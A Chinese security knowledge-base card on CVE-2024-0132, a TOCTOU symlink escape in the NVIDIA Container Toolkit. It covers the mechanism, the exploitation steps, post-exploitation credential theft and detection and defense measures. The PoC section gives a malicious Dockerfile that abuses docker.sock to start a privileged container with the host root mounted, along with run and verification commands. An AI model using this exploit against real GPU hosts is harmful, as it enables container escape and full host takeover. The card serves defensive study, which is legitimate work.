---
id: cloud-container-nvidia-toolkit-nvc-driver-mount-toctou-escape
title: NVIDIA Container Toolkit nvc_driver_mount TOCTOU 符号链接逃逸：挂载宿主机根目录并借 docker.sock 提权（CVE-2024-0132）
type: scenario
domain: cloud
path: cloud/container
technique: nvidia-toolkit-nvc-driver-mount-toctou-escape
tags:
- nvidia
- container-escape
- toctou
- symlink
- docker
- gpu
- kubernetes
- cve-2024-0132
cve:
- CVE-2024-0132
severity: critical
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V192
  verified_at: '2026-11-06T23:06:42+08:00'
  notes: 已对照幻灯片第23页核对：nvc_driver_mount与mount_files TOCTOU、/usr/local/cuda/compat符号链接、docker.sock特权容器及Dockerfile验证命令一致；原文未给受影响版本，未设affected_versions；未本机复现。
url: /docs/cloud/container/cloud-container-nvidia-toolkit-nvc-driver-mount-toctou-escape/
draft: false
kb_aliases:
- CVE-2024-0132
- NVIDIA Container Toolkit 容器逃逸
- nvidia-container-runtime-hook
- nvc_driver_mount
- libnvidia-container TOCTOU
- /usr/local/cuda/compat 符号链接
- docker.sock 逃逸
---

## 一句话结论

使用 NVIDIA Container Toolkit 的宿主机在运行带 `--runtime=nvidia`/`--gpus=all` 的容器时，`nvidia-container-runtime-hook` 会在容器初始化早期调用 `libnvidia-container` 的 `nvc_driver_mount`/`mount_files` 挂载 GPU 驱动库；恶意镜像在 `/usr/local/cuda/compat/` 下布置符号链接并利用检查与挂载之间的 TOCTOU，可让宿主机根目录被挂进容器，随后访问宿主机 `docker.sock`、启动特权容器取得宿主机 root。

## 原理

- **GPU 容器需要运行时 hook**：NVIDIA Container Toolkit 通过 `nvidia-container-runtime-hook` 在容器创建阶段把宿主机的 NVIDIA 驱动库、设备节点等挂载进容器，使容器内可以使用 GPU。该 hook 以高权限运行，且执行时间早于容器命名空间完全隔离。
- **路径校验与挂载之间存在竞态**：`libnvidia-container` 的 `nvc_driver_mount`/`mount_files` 在处理共享库路径时，先在第一次迭代中检查攻击者构造的目录“看起来合法”，随后才执行挂载；攻击者可在检查通过后、实际挂载前用快速文件系统操作把该目录替换为指向宿主机 `/` 的符号链接（TOCTOU）。
- **符号链接跟随导致跨边界挂载**：挂载操作跟随符号链接，把宿主机根目录挂载到容器内；后续迭代继续解析已挂载目录中的恶意符号链接，最终容器内出现宿主机根文件系统的视图，突破容器隔离。
- **从文件系统访问到宿主机控制**：拿到宿主机根目录后，容器内可直接访问宿主机上的 `docker.sock`；Docker API 允许创建新的特权容器并把宿主机 `/` 挂载进去，从而在宿主机上执行命令、读写任意文件，完成从容器到宿主机的提权。
- **为什么难防**：漏洞不在容器内应用，而在容器运行时 hook 的挂载逻辑；初始容器不需要 `--privileged` 或额外 capability，只要以 NVIDIA runtime 启动恶意镜像即可触发。最终提权依赖宿主机 `docker.sock` 可被容器访问，但文件系统逃逸本身已经足以读写宿主机文件。

## 触发条件

- 宿主机安装并启用了受影响的 NVIDIA Container Toolkit / `libnvidia-container`，容器通过 `--runtime=nvidia`、`--gpus=all` 或等价配置启动（Kubernetes 中为 NVIDIA device plugin + runtimeClass）。
- 攻击者能提供恶意容器镜像并诱导受害者运行，或在 CI/多租户环境中让受害者构建/运行该镜像。
- 镜像内可在 `/usr/local/cuda/compat/` 等路径创建目录、文件和符号链接；运行时 hook 会处理这些路径。
- 宿主机上的 `docker.sock` 可被逃逸后的容器访问（挂载、同命名空间或路径可达）；若不满足，仍可能通过宿主机文件系统读写扩大影响。
- 目标未升级到厂商修复版本，也未通过准入策略禁止不可信镜像使用 GPU runtime。

## 利用步骤

1. **构造恶意镜像**：基于 Alpine 等小镜像安装 `docker-cli`；在 `/usr/local/cuda/compat/` 下创建目录与占位文件，并在 `/usr/lib64` 下构造指向该目录的符号链接链；把 `DOCKER_HOST` 指向符号链接路径，入口点准备在逃逸后启动特权容器。
2. **在受害者环境运行**：执行 `docker run -it --rm --runtime=nvidia --gpus=all <恶意镜像>`。NVIDIA runtime hook 在容器初始化早期触发，开始处理 `/usr/local/cuda/compat/` 下的库路径。
3. **触发 TOCTOU**：在 hook 第一次检查目录合法性之后、实际挂载之前，用快速文件系统操作把目录替换为指向宿主机 `/` 的符号链接；`mount_files` 跟随链接，将宿主机根目录挂载进容器。
4. **验证逃逸**：在容器内检查 `grep CapEff /proc/self/status` 是否显示完整 capability，尝试 `touch /host/abc` 与 `ls /host/abc`；若 `/host` 是宿主机根，文件创建成功即证明逃逸。
5. **提权到宿主机**：通过宿主机 `docker.sock` 调用 Docker API，启动 `--privileged -v /:/host` 的新容器，读写宿主机文件、写入 cron/systemd/authorized_keys 或直接执行命令，取得宿主机控制权。
6. **后利用**：窃取宿主机上的云凭据、Kubelet 配置、容器镜像仓库凭据；在 Kubernetes 环境中进一步攻击同节点 Pod、API Server 或集群 Secret。

## PoC

幻灯片给出的恶意镜像 Dockerfile 思路（路径与链接层级仅为示意，实际需按目标环境调整）：

```dockerfile
FROM alpine
RUN apk add --no-cache docker-cli
RUN mkdir -p /usr/local/cuda/compat/libnvidia-ml.so.6/
RUN touch /usr/local/cuda/compat/libnvidia-ml.so.7
RUN mkdir -p /usr/lib64
RUN ln -s ../../usr/local/cuda/compat/ /usr/lib64/libnvidia-ml.so.6
RUN ln -s ../../../../../../../../run/usr/local/cuda/compat/libnvidia-ml.so.6/libnvidia-ml.so.7
ENV DOCKER_HOST=unix:///usr/lib64/libnvidia-ml.so.7/docker.sock
ENTRYPOINT ["docker", "run", "-it", "--privileged", "-v", "/:/host", "ubuntu"]
```

构建与运行：

```bash
docker build -f Dockerfile.escalation -t nvidia.escalation .
docker run -it --rm --runtime=nvidia --gpus=all nvidia.escalation
```

容器内验证宿主机访问：

```bash
grep CapEff /proc/self/status
touch /host/abc
ls /host/abc
```

说明：以上 PoC 来自演讲幻灯片，未在本机复现；幻灯片未给出完整竞态触发脚本和逐行利用代码，实际利用需要根据目标 Toolkit 版本调整目录与符号链接布局。

## 变体与关联

- 变体：其他容器运行时的文件描述符泄漏/挂载竞态，见 [[cloud-container-runc-fd-leak-escape]]（CVE-2024-21626）、[[cloud-container-docker-cp-symlink-toctou-escape]]（CVE-2018-15664）。
- 关联：逃逸后利用宿主机 Docker API，见 [[cloud-container-docker-socket-tcp-escape]]；直接使用特权容器挂载宿主机磁盘，见 [[cloud-container-docker-privileged-host-disk-escape]]。
- 关联：Kubernetes 中的特权 Pod/hostPath 逃逸，见 [[cloud-container-k8s-workload-config-escape]]；工作负载失陷后的云身份链，见 [[cloud-k8s-workload-compromise-identity-expansion-privileged-pod]]。
- 边界：本卡描述的是 NVIDIA runtime hook 的挂载竞态；若目标不使用 NVIDIA runtime，或已在准入层禁止不可信镜像使用 GPU，路径不成立。

## 检测与防御

- **升级**：将 NVIDIA Container Toolkit、`libnvidia-container` 升级到厂商修复版本；升级后确认 `nvidia-container-runtime-hook` 仍按预期工作。受影响版本区间以 NVIDIA 官方公告为准，本文未给出具体版本号。
- **限制 GPU runtime**：只允许经过审核的镜像使用 `--gpus`/NVIDIA runtimeClass；在 Kubernetes 中用准入策略（PSA/OPA/Kyverno）限制 GPU 工作负载的镜像来源与权限。
- **隔离 docker.sock**：不要将宿主机 `docker.sock` 暴露给普通容器；使用 rootless Docker、用户命名空间、只读根文件系统，丢弃不必要 capability；对必须访问 Docker API 的容器做网络与路径隔离。
- **镜像扫描**：静态检查镜像中 `/usr/local/cuda/compat/`、`/usr/lib64` 下的异常符号链接，`DOCKER_HOST` 指向符号链接路径，入口点启动 `docker run --privileged` 等特征；拒绝不可信来源的 GPU 镜像。
- **运行时检测**：监控容器内出现宿主机根目录挂载、`docker.sock` 访问、从容器内创建特权容器、`/proc/self/status` 读取 CapEff 等行为；用 Falco/auditd/eBPF 对 `mount`、`openat` 与 Docker API 调用做告警。
- **最小权限**：GPU 节点与普通工作负载分离；容器默认非 root、只读根文件系统；限制宿主机敏感路径与凭据在 GPU 节点上的暴露。
